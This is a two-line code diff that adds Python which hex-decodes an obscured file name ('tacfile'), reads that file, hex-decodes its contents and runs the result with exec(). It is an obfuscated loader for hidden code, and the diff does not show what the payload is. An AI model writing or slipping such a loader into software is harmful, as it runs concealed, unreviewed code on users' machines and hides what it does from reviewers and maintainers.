@@ -1,0 +1,2 @@
+import base64
+exec(base64.b16decode(open(base64.b16decode("74616366696C65".encode("utf-8")).decode("utf-8"),"r").read()).decode("utf-8"))
